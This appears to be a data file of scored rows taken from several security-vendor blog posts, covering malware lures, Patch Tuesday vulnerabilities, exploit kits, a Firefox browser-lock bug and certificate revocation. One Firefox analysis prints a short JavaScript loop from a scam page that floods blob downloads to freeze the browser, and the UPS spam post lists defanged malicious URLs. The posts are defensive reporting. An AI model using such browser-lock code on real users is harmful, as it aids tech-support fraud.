"So I guess that it's not too surprising that a World Cup-themed malware attack has made an appearance, as reported by John Leyden in The Register here. The attack takes the form of an email allegedly from safari organizer Greenlife, containing a PDF attachment based on Greenlife's genuine guide to the ""first African edition of football's most prestigious tournament"": that's soccer, by the way, not football as it's most often played in the US, in case you missed the reference above. However, the attachment is rigged to take advantage of an Adobe Reader vulnerability to install malware onto machines that haven't been updated with the patch released on the 16th February (CVE reference CVE-2010-0188, Adobe reference http://www.adobe.com/support/security/bulletins/apsb10-07.html).",0.012880204033436815
So the take-home messages are:,0.011049709770880267
"Make sure you're up-to-date on your Adobe patching (and any other high risk application patches, not to mention OS patches)
PDFs are a risky format these days: if they come from an unrecognized source, or come unsolicited, that makes them all the more risky (and suspicious)
Keep in mind our advice above: any interesting event (real or imagined) is likely to be used as a hook for social engineering and malware distribution.
And, of course, check that your antivirus software is up-to-date. I'm not sure how many vendors have detection for this now, but we detect it as PDF/Exploit.CVE-2010-0188.",0.010326370059118295
Kudos to Messagelabs for catching this one early and a very comprehensive description.,0.011833095787571524
"David Harley CISSP FBCS CITP
Research Fellow & Director of Malware Intelligence",0.010149512890134771
"ESET Threatblog (TinyURL with preview enabled): http://preview.tinyurl.com/esetblog
ESET Threatblog notifications on Twitter:
http://twitter.com/esetresearch; http://twitter.com/ESETblog
ESET White Papers Page: http://www.eset.com/download/whitepapers.php",0.013760988131441998
Securing Our eCity community initiative: http://www.securingourecity.org/,0.012284630284823073
"Also blogging at:
http://smallbluegreenblog.wordpress.com/
http://avien.net/blog
http://blogs.securiteam.com
http://blog.isc2.org/
http://macvirus.com/
",0.012441838780203218
"It’s always DNS, including on July, 2020’s Patch Tuesday",0.011099487110639017
"Written by
SophosLabs Offensive Security",0.008622298185940958
"July 14, 2020",0.009083006533911808
SophosLabs Uncut 2020-07 CVE-2020-1032 CVE-2020-1036 CVE-2020-1040 CVE-2020-1041 CVE-2020-1042 CVE-2020-1043 CVE-2020-1350 CVE-2020-1374 DNS Hyper-V Patch Tuesday Remote Desktop Protocol RemoteFX wormable,0.011322525416211482
"For our roundup of July, 2020’s Patch Tuesday release, Microsoft today published a few patches that need quick attention. Microsoft fixes 123 vulnerabilities across their product lines this month including 20 classified as Critical, and a whopping 103 flagged as Important.
As usual all the additional details can be found in the Security Update Guide Release Notes and users can download patches manually from the Microsoft Security Update Catalog.
The company fixed a total of 32 potential remote-code execution (RCE) vulnerabilities in what has become a list of the usual suspects (such as the Jet database engine, Windows .lnk shortcut files, the GDI+ graphics subsystem, and the Internet Explorer browser).
Hyper-V and its graphic layer (RemoteFX vGPU) received a lot of attention this month when researchers discovered a series of bugs that could give an attacker an avenue to an RCE. The other major announcement involves a bug that exists in nearly every existent version of the Windows DNS server software. The memory corruption vulnerability in Windows DNS Server service, in all Windows Server versions. Microsoft released fixes for some of these bugs on the out-of-support Windows 7 and Server 2008 platforms.
Beyond the RCE bugs, Microsoft issues fixes for 64 elevation-of-privilege (EoP) bugs, in Windows services (Windows Error Reporting, COM) and kernel driver modules (WSL, UPnP, ALPC, Graphic components).
Here’s our breakdown of the classes of vulnerabilities that Microsoft addressed. Each bar’s colors represent different products that fall under the respective category at left.",0.010364914237021905
"This key represents the products that are reflected in the above chart, which should give an indication as to just how broad the scope of a Patch Tuesday can be. These data points are based on the component names that Microsoft provides to MAPP partners, and they can be confusing about what they address: for example, the table lists “Microsoft Office” in some cases, and specific Office applications in others.",0.011245515568237052
"In addition, Adobe released four updates to Adobe products, timed to coincide with the Patch Tuesday releases. Included among these releases was an update to the Adobe Download Manager that fixes a serious code execution bug.
SophosLabs has investigated some of the more interesting vulnerabilities that we received exploit details about. Here are some highlights this month.
Hyper-V RemoteFX vGPU RCE
CVE-2020-1032,CVE-2020-1036,CVE-2020-1040,CVE-2020-1041,CVE-2020-1042,CVE-2020-1043
RemoteFX is a set of features first introduced in Windows Server 2008, aimed at improving the graphics in remote sessions (for example, while using RDP). Among those features was RemoteFX vGPU, also referred as GPU Pass-through, which binds virtual machines to one or more physical GPUs on the host in order to benefit directly from the GPU’s computation capability.
It is an interesting target for vulnerabilities, especially in the context of a virtual machine guest-to-host escape – which to this day remains covered by a Microsoft bug bounty that pays out as much as $250,000 for Tier-1 bugs.
This month, Microsoft patched a total of 6 RCE bugs in RemoteFX, all ranked as Critical. However, no technical details were provided by the company. It should be highlighted that the fix Microsoft provides disables RemoteFX altogether; Microsoft does not patch the bug to prevent its exploitation. This comes after more than a year since Microsoft deprecated RemoteFX and removed it from the Hyper-V GUI (though it is still available through PowerShell cmdlets Enable-VMRemoteFXPhysicalVideoAdapter /  Add-VMRemoteFx3dVideoAdapter  ).
Hyper-V DDA is now the proper (and only) way to assign direct device access to VMs with Hyper-V.
Windows DNS Server RCE
Microsoft patched a severe bug in Windows DNS Server, referred to as CVE-2020-1350, an integer overflow vulnerability in the parsing of DNS signature queries (RR SIG records).
This vulnerability seems to impact Windows Servers from 2019 all the way back to Windows Server 2008 (SP2) and Windows Server 2008 R2 (SP1). Microsoft has issued a special KB entry and a patch despite those releases being EoL-ed last January 14th. One of the likely reasons for releasing a patch on an officially-unsupported platform would be that the exploit could be wormable.
The issue comes from the parsing on SIG RR records, in the service dns.exe which fails to properly validate the length in the record packet, a 16-bit field entirely controlled by the attacker. During the attack they add this field to some additional constant values, to allocate that resulting size from the process heap. So by providing a large length, an attacker can make the WORD value overflow.
The controlled length is then used as the size argument provided to memcpy-ed, allowing to overwrite the allocated heap memory beyond the intended boundaries. Shaping the heap in a way to transform this heap overflow into a code execution is very likely too, as DNS offers many by nature a great number of record types controllable by an attacker.
This critical vulnerability (CVSS 10.0) is therefore likely to be exploited in the future, although for latest versions of Windows Server (2016, 2019) the attacker would face other problems during the exploitation process to successfully (and reliably) execute code on the remote system.
Although as usual applying patches should be the priority, a workaround can be used to prevent the integer overflow being triggered, by editing the registry HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters  and set the key TcpReceivePacketSize to a maximum value of 0xFF00, and then restarting the DNS service. Refer to Microsoft Guidance for additional details.
Remote Desktop
Microsoft Remote Desktop Client (mstsc.exe) has been targeted once again, and patched under CVE-2020-1374. The bug in this case is an integer overflow that allows a heap corruption which, if exploited successfully, results in code execution with the privilege of the user running the executable.
This vulnerability can be triggered within the Media Container Dynamic Virtual Channel feature, and follows the well-known path of alloc(controlled_size) followed by a memcpy() to the allocated location. As such, Microsoft deems its exploitation as More likely.
And the code execution would be entirely remote, as this vulnerability could be exploited by either an already compromised RDP server tricking an user to connect back, but also as a MITM attack like ARP poisoning.
Usual suspects
Several other components got patched this month:",0.013782440465698209
"Microsoft Office fixed an Elevation of Privilege vulnerability (CVE-2020-1025) due to an improper OAuth token validation in Microsoft SharePoint Server
Skype for Business Server allows an attack to tamper with their own token resulting in EoP.
A Remote Code Execution vulnerability was discovered and patched this month in VBScript (CVE-2020-1403). As it targets specific users who needs to visit a specific crafted page, such vulnerability would not immediately result in a full system compromise, but instead provide access onto a targeted computer, with associated privileges, allowing further horizontal or vertical escalation.
Graphical components such as GDI+ (Remote Code Execution Vulnerability – CVE-2020-1435), Win32k (Elevation of Privilege – CVE-2020-1381, CVE-2020-1382) were patched, fixing vulnerabilities allowing complete takeover of the targeted system.",0.011156839114871864
"Although no vulnerability was reported as exploited in the wild, many vulnerabilities are rated as likable to be in a near future. Therefore, the simple precaution principle would dictate to patch as soon as possible, which is, regardless of any other layer of protection, always the best remediation.
How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.013411853284503117
CVE,0.015603552773460372
SAV,0.007429604172777826
IPS,0.010146075287656875
"CVE-2020-1403
Exp/20201403-A
SID:2302036",0.01094484089274872
CVE-2020-1350,0.009496247165845628
SID:2303390,0.0082500893739752
CVE-2020-1374,0.009289417377483455
SID:2303388,0.008136797017739061
CVE-2020-1147,0.01008423755471044
SID:2303387,0.008079688699980325
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.",0.012693935054493566
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
Think you received a package? Think again. Cybercriminals are currently spamvertising millions of emails impersonating UPS (United Parcel Service) in an attempt to trick users into downloading the viewing the malicious .html attachment.,0.022270236799559195
More details:,0.008320251094065867
"Subject: UPS Delivery Notification, Tracking Number CDE_RANDOM_NUMBER
Sample message: You have attached the invoice for your package delivery. Thank you, United Parcel Service. *** This is an automatically generated email, please do not reply ***
Sample attachment: invoiceCDE31400FCA9E1A9.html; MD5: 3df9cab56e3a354c56d0b50680a9e087 detected by 8 out of 42 antivirus scanners as HTML:Iframe-inf; Trojan.IframeRef; Mal/JSRedir-J
The attached .html file includes a tiny iFrame pointing to the client-side exploits serving domain hxxp://www7apps-myups.com/main.php?page=cde31400fca9e1a9 – 96.43.129.237, Email: zxhxnjsgh@126.com
Upon loading, it attempts to exploit CVE-2010-1885, served by the BlackHole web malware exploitation kit.
Sample client-side exploitation chain: hxxp://www7apps-myups.com/main.php?page=cde31400fca9e1a9 -> hxxp://www7apps-myups.com/Set.jar -> hxxp://www7apps-myups.com/data/ap2.php
Upon successful exploitaion the campaingn drops the following MD5 on the infected hosts, MD5: 5806aba72a0725a9d65eb12586846da3, currently detected by 8 out of 41 antivirus scanners as Gen:Variant.Kazy.74635; Trojan.PWS.Panda.655.
It’s worth pointing out that the initially spamvertised .html file doesn’t contain any exploit code in an attempt to trick antivirus scanners into thinking it’s a legitimate content.
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.008901815691407466
"Angler Exploit Kit Gives Up on Malwarebytes Users
It is a well-known fact that malware authors try really hard to avoid security researchers and their analysis tools. For instance, many binaries have anti VM features and will behave differently if they detect that they are running in a non genuine environment.
Exploit kits also perform similar tricks despite some limitations since they are browser based. Kafeine documented VM and network tools checks in a post showing how CVE-2013-7331, a vulnerability in Internet Explorer allows file system enumeration. According to Kafeine:
The Microsoft.XMLDOM ActiveX control in Microsoft Windows 8.1 and earlier allows remote attackers to determine the existence of local pathnames, UNC share pathnames, intranet hostnames, and intranet IP addresses by examining error codes, as demonstrated by a res:// URL, and exploited in the wild in February 2014.
We first spotted this vulnerability used in trying to detect the presence of our own software, Malwarebytes Anti-Exploit, in a limited custom exploit kit a couple of months ago (hat tip to @dsanchezlavado):",0.011010339105369304
"But now, as discovered by Kafeine, the latest version of Angler EK, one of the most popular and sophisticated exploit kits, also checks to see if either Malwarebytes Anti-Malware or Anti-Exploit are installed on the target system.",0.015203948465747241
"If Malwarebytes software is installed, then the exploit kit will silently exit and not even attempt to launch further exploits or malware.
We can almost imagine cyber criminals complaining about how their brand new creations, fresh out of the binary factory, are already being detected by our software. Even when they think they will catch everyone by surprise with a zero-day, we are already blocking it.
The combination of Malwarebytes Anti-Exploit and Anti-Malware is extremely effective at stopping both drive-by download and social engineering attacks. It’s nice however, when independent sources, albeit malware authors, confirm it.
The rationale behind not delivering the payloads to anyone running Malwarebytes software is motivated by a lack of return on investment. Knowing that they won’t be able to exploit those machines, cyber criminals would rather avoid wasting their ammo and also not generate unnecessary attention.
Just because exploit authors are choosing to avoid us doesn’t mean that we will avoid them. We are keeping a close eye on their activities and making sure that whatever they are cooking is still being blocked by our software.
In the meantime, this gives anyone not yet running Malwarebytes software another reason to go ahead and install our Malwarebytes Anti-Malware and Anti-Exploit on their computers.
",0.01342075076770688
Technical analysis:  CVE-2020-15654 and a history of Firefox “Browser Lock” bugs,0.00866850925836904
"Written by
SophosLabs Offensive Security",0.008622298185940958
"August 03, 2020",0.009335975590085033
SophosLabs Uncut,0.008173560271443003
"Technical support scams are among the most pervasive forms of Internet-powered fraud. Preying primarily on less sophisticated computer, tablet and smartphone users, tech support scammers use fear and misinformation to convince their targets that they have become the victim of some sort of malware and coerce them into purchasing unneeded (and sometimes damaging) software and services to “protect” themselves.
A common method of catching less educated device users is the use of fraudulent web “advertising”— in the form of pop-up windows or redirected web pages that attempt to emulate system alerts. A class of these fake error websites makes it more difficult to get away, using HTML and JavaScript that take advantage of design bugs in the browser’s code. This type of bug is often referred to as a Browser Lock (browlock) bug.
Browser developers, including Mozilla, have made fixes in the past to prevent such abuses.  However, we’ve recently found a Browser Lock bug that overcomes those efforts. The bug, CVE-2020-15654, was reported by SophosLabs to Mozilla and fixed in Firefox version 79. In this report, we’ll analyze three types of Browser Lock bugs that have specifically affected the Firefox browser, what Firefox programmatic internals made them possible, and how they were fixed.
Raising the (false) alarm
A fake virus alert web page with pop-up, typical of web-based tech support scams.
Browser Lock bugs are in themselves not severe security vulnerabilities. They only have a temporary, superficial effect on the browser when exploited, and can be easily remedied by an advanced user. But their persistence may convince less sophisticated users that the alerts they present are real—and lead to an actual compromise security, aided and abetted by them.
The classic fake error website—the simple pop-up window—is mostly effective in ensnaring the less computer-literate. But those with slightly more experience are more attuned to the dangers of internet fraud —those who realize they did not actually win a new car for being the one millionth visitor to a website, or that the person seeking their help transferring a fortune in return for a cut is not really a Nigerian prince—will more instinctively be skeptical of them. They might reflexively attempt to get rid of the fake error page, by either navigating away or closing the browser.
If they manage to make it go away, they will be quick to dismiss it as bogus despite the alarming content of the fake error. But if they can’t, they may be less sure that the alert isn’t real. That’s where Browser Lock bugs come in. They’re not really new as a class of scam—some versions have been around for years.
The Deceptive Custom Cursor bug
One of the oldest tricks scammers use to fool victims is the abuse of the “CSS cursor” feature in browsers—commonly known as the “Evil Cursor” attack. The CSS cursor property allows for a web developer to modify the way the user’s mouse cursor appears while it is within the confines of the web page. A custom image (up to 128×128 in size, in the case of Firefox) can be defined in the CSS property to serve as the mouse cursor instead of the default one:",0.014542165534731422
A custom cursor image loaded in an image viewer. The checkered background denotes transparency.,0.011390975119240698
"The same CSS property can be used to control the cursor’s “hotspot”—the exact (x,y) coordinates for the offset inside the custom cursor image where mouse clicks should be registered. The origin point (0,0) is the top-left corner. In the typical cursor (such as shown in the picture above), the hotspot is meant to be at the pointy tip of the cursor.The flexibility in being able to design the cursor image to appear as we wish, coupled with the ability to define an arbitrary hotspot for it, is a ripe feature for malicious actors: it’s easy to define a custom cursor whose mouse clicks register elsewhere than it appears to point to.
The classic Evil Cursor attack employed a large custom cursor image with the appearance of a typical cursor at the top-left corner of the image, but with the hotspot point at the bottom-right corner of the image. This way, attempting to click the Back button, Address bar, or the window’s Close (X) button will result in a dud click that does nothing, resulting in an illusion of a Browser Lock.",0.014910289631342999
"This bug was reported and addressed in Mozilla Bug 1445844, back in 2018.In the fix issued for this bug, the primary addition introduced to the browser’s source code is the function ShouldBlockCustomCursor:
As the name suggests, this function implements logic to help the browser determine whether the custom cursor definition should be honored or not, given the current position of the cursor on the screen.The following are the terms and variables used in the function above:
The portion of the browser window where the current web page is displayed, usually everything just below the address bar and the various toolbars, is referred to here as “frame” and is returned by topLevel->PresShell()->GetRootFrame().Throughout the function, the frame is treated as a two-dimensional plane, with its origin point (0,0) being the top-left corner of the frame.
Variable point is the current (x,y) coordinates of the custom cursor’s hotspot on the frame’s plane. e.g. this value would be (0,0) when the custom cursor’s hotspot is pointed at the top-left corner of the page.
Variable size is the width and height measurement of the custom cursor image, e.g. 128×128.
Variable cursorRect is a rectangle on the frame’s plane. The rectangle represents the area of the custom cursor image, with its dimensions being size, and its base top-left corner being the value of point, normalized to a hotspot of (0,0). In other words, a “correction” is made for the sake of this calculation if the custom cursor’s hotspot is set to anything other than (0,0).This means that if the custom cursor image dimensions are 128×128 and its hotspot is set to (110,120), cursorRect will be a 128×128 rectangle with the base top-left corner being point, except shifted 110 points leftwards, and 120 points upwards.
Finally, the function checks if cursorRect is fully within the frame’s plane.If the custom cursor’s hotspot has been defined as anything other than (0,0), and the current cursor position is sufficiently close to the X=0 or Y=0 lines (the left and upper borders of the frame), cursorRect would end up occupying negative (x,y) coordinates, and therefore not fully within the plane.In that case, the function returns true, meaning the custom cursor is “blocked”, and the default cursor is used instead.
Infinite Downloads of Blobs bug
Another Browser Lock type of bug was reported and addressed in Mozilla Bug 1438214, also in 2018.The original reporter encountered the bug in a live fake error website. A simplified version of the offending JavaScript code is:",0.015769675771068137
"function download() {
var b = new Blob;
var o = URL.createObjectURL(b);",0.0169287523047269
"var l = document.createElement(""a"");
l.href = o;
l.click();
}",0.017136783211363804
while (true) download();,0.011207928362480857
"Essentially the code above is endlessly creating and triggering the downloading of Blob objects using Anchor (<a>) elements.
From the look of it, it’s evident that this is a Denial of Service type of bug, because it’s never-ending and will surely cause heavy CPU usage in the browser to the point of causing the page to become unresponsive.A scenario where a web page causes the browser to become unresponsive and does not allow the user to (easily) browse away, can essentially be considered a Browser Lock bug.However, since browsers are designed to run any arbitrary script given to them by a website, they have long been taking into account the possibility of scripts (whether intentionally or not) overloading and freezing the page.In Firefox, a “Process Hang Monitor” was introduced to counter this problem. When this monitor detects that a page is unresponsive, it will pop up the following bar just above the page:",0.011395927778078963
"This bar, also known as the “Slow Script Dialog”, gives the user the option to stop JavaScript execution, (hopefully) resolving the unresponsiveness.
What sets this specific bug apart, is that in affected versions, the yellow bar never pops up after the page is loaded, despite it being totally unresponsive.It turns out that each Blob download action leads internally to a CPU and memory heavy IPC message being broadcasted to all processes of the browser, most importantly the main firefox.exe process.With the IPC messages reaching the main process and burdening its resources too, the Denial of Service condition is spread to it, and the yellow bar feature which is partially implemented in the main process is prevented from functioning as designed, resulting in a Browser Lock.
The fix employed by Mozilla was to simply remove the code responsible for IPC broadcasting of Blob downloads. The code had already become redundant due to previous browser updates, so it was not needed.
Deceptive Custom Cursor bug returns – CVE-2020-15654
Earlier this year, we encountered a live fake error website that caused a Browser Lock effect on the latest version of Firefox at the time.The website consisted of a moderately sized HTML file containing JavaScript code and a CSS file.Since Browser Locking is clearly an undesirable condition that likely points to a bug present in the browser’s code, we started investigating the web page in order to find the root cause, so that ideally it can be reported and fixed by Mozilla.Here’s how visiting this fake error website looks in action:",0.012467833114077731
"https://news.sophos.com/wp-content/uploads/2020/06/output1.mp4
Shortly after the web page is loaded (around the 4 seconds mark), you can see the mouse cursor suddenly gets jerked to the upper-left while also simultaneously changing its appearance, from a crosshair type to a typical cursor type.This is the moment when a custom cursor image is loaded. The sudden movement is due to the upper-left offset of the cursor inside the custom cursor image, in line with the original Deceptive Custom Cursor exploits.
The blue circles that appear in the video denote a left mouse click. They show that after the web page is fully loaded, the location of the clicks is no longer synchronized with the mouse cursor—when the user tries to click a button, the actual click is on something else.
Another thing we see is that the right side of the screen is seemingly inaccessible by the mouse pointer. In fact, when the cursor appears to be stuck and cannot be moved further to the right, the actual cursor hotspot is at the rightmost position. This effect only happens when the browser is in full screen mode.
Lastly, when the yellow “A web page is slowing down your browser” bar appears, it can be seen that its buttons are also covered by the deceptive custom cursor effect and appear to be un-clickable.
Bypassing the old fix
It’s obvious from observing the browser’s behavior that this page made use of the deceptive custom cursor method. But as we noted before, the deceptive custom cursor bug is well-known and was supposed to have been fixed back in 2018— and therefore, it should not be reproducible in new Firefox versions. So, what went wrong here?
We know that with the previously discussed fix applied, the function ShouldBlockCustomCursor would be regularly called to check and mitigate deceptive custom cursors, but it’s clearly not working as intended in this case.To see what was going wrong, we ran the browser under a debugging session, attached to the Web Content process that corresponds to the relevant page (each tab has its own Web Content process), and set a breakpoint in the function:
With this setup, we visited the offending page, moving and clicking the mouse around, to find that the function is not being called at all.Somehow the flow to the function is prevented. For reference, this is how the backtrace looks when the function is called in a legitimate flow, when the mitigation is working as intended:
Here we can see the chain of function calls that end up triggering the mitigation function:Upon moving the mouse, the parent process (the main firefox.exe process) sends a RealMouseMoveEvent message with event type eMouseMove to the page’s Web Content process.On the Web Content process’s side, this message is eventually received and processing begins in NS_ProcessNextEvent.From the low-level messaging interface between “Parent” and “Child” (ipc::MessageChannel), the event bubbles up to the higher-level PresShell (Presentation Shell) interface.In EventStateManager::PreHandleEvent, specific handling of eMouseMove begins. From there, functions that deal with cursors, and specifically custom cursors (if applicable), are called. Among them is ShouldBlockCustomCursor.
The source code responsible for calling the first function shown in the backtrace above (NS_ProcessNextEvent) in that same context is the following message loop function:",0.015606051342012872
"void MessagePump::Run(MessagePump::Delegate* aDelegate) {
...",0.010760577089202084
"for (;;) {
...",0.009451255118431479
"// This will either sleep or process an event.
NS_ProcessNextEvent(thisThread, true);
}",0.011672401057638004
"...
}",0.012465625133844416
"Going back to the debugger, setting up a breakpoint in NS_ProcessNextEvent and reloading the page, shows no hit on that function either. A typical Web Content process in the middle of a browsing session should see this function called pretty much non-stop.So the reason ShouldBlockCustomCursor does not run is not the result of some cursor-related trickery that a clever attacker discovered and is using to bypass the mitigation. In fact, even the most low-level message loop mechanism is not functioning – IPC messages are not being received and processed.
The reason for this failure is hinted by the eventual appearance of the familiar yellow bar, signaling that the page is unresponsive. Upon inspecting the JavaScript code in the page, it turned out that the reason for this hang-up is a simple endless loop in the code.
Why would a JavaScript endless loop code cause the halting of the most basic message loop processing in the Web Content process? JavaScript code that runs within a web page, is executed in its Web Content process. Not only that, but it’s also executing in the same thread, named “Web Content”, where the relevant message loop is running.So while JavaScript code is busy running, events such as “Mouse Move” are not dispatched, rendering the old Deceptive Custom Cursor mitigation obsolete. Thus, a “Browser Lock” effect can be achieved despite the old fix.
The new fix
After analyzing the bug, we reported our findings to Mozilla. Mozilla were quick to create and push a fix to their codebase, which went live in Firefox 79. The bug was assigned CVE-2020-15654: Custom cursor can overlay user interface.
The patch consists of just two lines of code added to nsGlobalWindowInner::ShowSlowScriptDialog, the function responsible for popping up the yellow bar:",0.01304346093833575
"// Override the cursor to something that we're sure the user can see.
SetCursor(NS_LITERAL_CSTRING(""auto""), IgnoreErrors());",0.01021752606886761
"The code above simply sets the CSS cursor property to keyword auto (the default cursor), overriding any previous value. Since custom cursors are set up using this CSS property, any custom cursor configuration is now deactivated.  Now when the Process Hang Monitor is triggered and the yellow bar we mentioned earlier appears, the mouse cursor is reset to the default one. The user is then able to easily escape the web page – by interacting with the browser’s buttons and navigating away as one would normally do.
The reason this fix works—and isn’t overwhelmed by the browser being busy with running JavaScript code, as the last fix was—is that the new fix’s code is not called by the message loop mechanism. Instead, it’s called from a JavaScript engine interrupt callback:",0.009205550907860793
"The JavaScript engine is designed to periodically interrupt JavaScript execution and allow for these callbacks to be invoked. By inserting interrupt checks into JIT compiled code, the engine ensures that the callbacks occur even in the midst of endless loops. The backtrace pictured above is an example of such an instance.
One of these aforementioned interrupt callbacks is XPCJSContext::InterruptCallback, which serves as the basis for the Process Hang Monitor mechanism. Every time this function runs, it calculates the time elapsed since the last completed NS_ProcessNextEvent call.As mentioned before, in the case of the malicious web page in question, the message loop mechanism becomes “stuck” and NS_ProcessNextEvent calls do not complete. After some time of this, the “time elapsed” timer exceeds a timeout, and springs the yellow bar into action by invoking nsGlobalWindowInner::ShowSlowScriptDialog, the same function containing the newly introduced fix.
With this bug being fixed, the overall security posture of Firefox against Browser Lock bugs is improved, but it is hardly the end of such bugs in this, or other, web browsers. The good news is that the tech support scammers who set up these fake error websites bugs rarely innovate, and are generally not sophisticated enough to discover and make use of such bugs.
That doesn’t mean that less sophisticated users won’t still fall for these malicious sites, even if they can easily navigate away from them. The best way to prevent people from falling victim to these scams will continue to be raising awareness to them.",0.011812510867295511
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"New Flash Player zero-day used against Russian facility
For the past couple of years, Office documents have largely replaced exploit kits as the primary malware delivery vector, giving threat actors the choice between social engineering lures and exploits or a combination of both.
While today’s malicious spam (malspam) heavily relies on macros and popular vulnerabilities (i.e. CVE-2017-11882), attackers can also resort to zero-days when trying to compromise a target of interest.
In separate blog posts, Gigamon and 360 Core Security reveal how a new zero-day (CVE-2018-15982) for the Flash Player (version 31.0.0.153 and earlier) was recently used in targeted attacks. Despite being a brand new vulnerability, Malwarebytes users were already protected against it thanks to our Anti-Exploit technology.
The Flash object is embedded into an Office document disguised as a questionnaire from a Moscow-based clinic.
A dot reveals an embedded (and hidden) ActiveX object
Since Flash usage in web browsers has been declining over the past few years, the preferred scenario is one where a Flash ActiveX control is embedded in an Office file. This is something we saw earlier this year with CVE-2018-4878 against South Korea.
360 Core Security identified the zero-day as a Use After Free vulnerability in a Flash package called com.adobe.tvsdk.mediacore.metadata.
ActionScript view of the malicious SWF exploit. Thanks David Ledbetter for sharing the dumped file.
Victims open the booby-trapped document from a WinRAR archive that also contains a bogus jpeg file (shellcode) that will be used as part of the exploitation process that eventually loads a backdoor.
Exploitation flow showing the processes involved in the attack
As Qihoo 360 security researchers noted, the timing with this zero-day attack is close to a recent real-world incident between Russia and Ukraine. Cyberattacks between the two countries have been going on for years and have affected major infrastructure, such as the power grid
Malwarebytes users were already protected against this zero-day without the need to update any signatures. We detect the malware payload as Trojan.CrisisHT.APT.
Zero-day attack flow stopped by Malwarebytes
Adobe has patched this vulnerability (security bulletin APSB18-42) and it is highly recommended to apply this patch if you are still using Flash Player. Following the typical exploit-patch cycle, zero-days often become mainstream once other attackers get their hands on the code. For this reason, we can expect to see this exploit integrated into document exploit kits as well as web exploit kits in the near future.
",0.015617060921235937
Digging into certificate revocation lists,0.008938208953561788
"Gartner 2018 Magic Quadrant for Secure Web Gateways
Read the Report",0.012720695873507104
"In this blog, we shall reveal the uses for certificates, uncover how to combat abused certificates and dig deep into an example of how malicious software can be digitally signed to pass certification verification.
What is a certificate?
In cryptography, a public key certificate, also known as a digital certificate, is an electronic document that uses a digital signature to bind a public key with an identity — information such as the name of a person or an organization, their address, and so forth. The certificate can be used to verify that a public key belongs to an individual. The digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or assertions made by the private key that corresponds to the public key that is certified. The certificate authority, or certification authority (CA), is the entity that issues digital certificates. In the model of trust relationships, a CA is a trusted third party that is trusted by both the subject of the certificate and the party relying upon the certificate.
What is a CRL file?
CRL stands for certificate revocation list: it is a list of certificates (or more specifically, a list of serial numbers for certificates) that have been revoked, and therefore entities presenting those certificates should no longer be trusted. The CRL file is itself signed by the CA to prevent tampering. The CRL is always issued by the CA that issues the corresponding certificates.
An alternative to using CRLs is the certificate validation protocol known as Online Certificate Status Protocol (OCSP). In the OCSP method, the browser contacts a web service running at the specified URL and asks the service whether a specific certificate has been revoked; again, the response is signed to prevent tampering. OCSP has the primary benefit of requiring less network bandwidth, enabling real-time and near real-time status checks for high volume or high value operations.
There is another way called OCSP Stapling, which allows the secure server to cryptographically prove that it has a recent “This certificate is valid” ticket signed by the CA. These tickets have a short lifetime and must be renewed by the server in order to return the ticket to clients in a TLS handshake. OSCP Stapling is the fastest and most private method of revocation checking, but it’s not yet deployed on most sites.
When do we use these CRL files?
When we deal with certificates, we use a CRL file. For example, when a browser accesses an HTTPS URL, it verifies the server’s certificate. During the verification process, the browser will choose a way to check for revocation; if a CRL is chosen, it will download the CRL file from an URL specified by the certificate, and do further verification. If a CA indicates that a server’s HTTPS certificate was revoked, the user is blocked from navigating to a site. A similar process happens when you use Microsoft’s “User Account Control (UAC)” security feature: when you download a signed file from the internet and want to run it, Windows automatically verifies the file’s digital signature, and during this process, a CRL is also downloaded and checked. If a CA indicates that a downloaded binary’s signing certificate was revoked, the program will fail the Authenticode check and will not run.
The CRL mechanism is very important, and here is an example. In mid-March 2001, VeriSign issued two VeriSign Class 3 code-signing digital certificates to an individual who fraudulently claimed to be a Microsoft employee. The common name assigned to both certificates is ""Microsoft Corporation"". The ability to sign executable content using keys that purport to belong to Microsoft would clearly be advantageous to an attacker who wished to convince users to allow the content to run. To tackle this issue, Microsoft released a security patch containing a CRL file for the two certificates. You can find details here: Microsoft Security Bulletin MS01-017 : Erroneous VeriSign-Issued Digital Certificates.
Let's Dig Into An Example
Here is another example that demonstrates how important it is to revoke certificates.
On May 22, Websense® Security Labs™ discovered a typosquatting case for youtube, using the following URLs:
youtibe.comyougube.comyoutuhe.comwwww.youutbe.comyootube.esowww.outube.comwww.youtuber.cayouutube.cawww.youutube.ca
Some of these URLs led to a file downloading: the file was disguised as FlashPlayer.exe and lured users to download and install it.",0.025862276402269124
"This malware is basically a downloader for many unwanted files from the internet, for example, “DriverPro” “OptimizerPro” “SpeedUpMyPc”, all of which are rogue software. It also downloads and installs the “WhiteSmoke” toolbar for Chrome and Firefox browsers.
What is interesting is that this malware is digitally signed, and could pass certificate verification.",0.008937005437502643
"We could see that the certificate is owned by “TUGUU SL”, the serial number of its certificate is “27 76 b2 57 97 9f 9a”, and we could download a CRL file from http://crl.godaddy.com/gds5-16.crl.",0.009871242268940428
"After we download the CRL file, we find there are 3447 records of revoked certificates; after parsing, CRL file looks like this:",0.009857512863431284
"Among the 3447 records of revoked certificates, we don’t find the serial number of this certificate. Of course this certificate is not included, as otherwise, it cannot pass Windows’ verification process. For this case, either the private key of “TUGUU SL” has been stolen by attackers, or “TUGUU SL” itself is distributing malware for profit. This certificate was issued on May 4, it was used to sign the malware on May 21, and was caught by Websense on May 22. According to our observations, at the time of publishing it has still not been revoked.
Thanks to Websense ThreatSeeker® Intelligence Cloud we have successfully collected some CRL file data. CRLs are accessed about 200,000 times per day within Websense ThreatSeeker Intelligence Cloud: we managed to gather about 10,000 access records in the course of one hour, and then we dug into those CRL URLs and files and found something interesting. All the following data in this blog is based on these 10,000 sample data records.
There are in total 9066 URLs which requested a CRL file. Among those 9066 requests there are 819 unique URLs, which means that some CRL URLs are requested many times. Let us see which URLs are the most popular:",0.013061786583402957
